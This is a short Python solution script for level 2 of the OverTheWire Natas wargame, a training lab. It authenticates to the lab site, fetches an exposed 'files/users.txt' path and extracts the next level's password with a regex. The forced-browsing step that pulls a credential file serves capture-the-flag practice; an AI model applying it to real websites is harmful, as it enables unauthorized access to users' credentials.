import requests
import re

username = "natas2"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/" % username

response = requests.get(url, auth=((username,password)))
pageContent = response.text
print(pageContent)
print("="*50)

new_path="files/users.txt"
response = requests.get(url+new_path, auth=((username,password)))
pageContent = response.text
print("\nThe password for the next level is: " + re.findall("[a-zA-Z0-9]{32}",pageContent)[0])